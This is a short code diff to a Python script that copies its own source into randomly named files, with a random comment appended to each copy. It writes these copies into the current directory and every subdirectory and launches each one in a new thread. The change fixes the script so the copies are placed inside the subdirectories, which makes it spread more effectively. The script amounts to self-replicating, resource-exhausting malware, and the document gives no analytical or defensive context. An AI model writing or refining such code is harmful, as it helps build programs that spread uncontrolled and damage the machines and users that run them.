@@ -39,10 +39,10 @@ lines = f.readlines()
 f.close()
 
 
-def create_file():
+def create_file(dir):
     filename = "{randomness}.py".format(
         randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
-    i = open(".\\" + filename, "w")
+    i = open(dir + "\\" + filename, "w")
     writeIntoFile(i, lines)
     i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
     i.close()
@@ -50,7 +50,7 @@ def create_file():
 
 
 # Create the new file in current dir and run
-thread = Thread(target=runFuncv, args=[".\\" + create_file()])
+thread = Thread(target=runFuncv, args=[".\\" + create_file(".\\")])
 thread.start()
 
 #walk to subdirs
@@ -58,7 +58,7 @@ for x in os.walk(directory):
     if x[0] == os.getcwd():
         continue
     # Create the new file and include a different name
-    thread = Thread(target=runFuncv, args=[x[0] + "\\" + create_file()])
+    thread = Thread(target=runFuncv, args=[x[0] + "\\" + create_file(x[0])])
     thread.start()
 
 
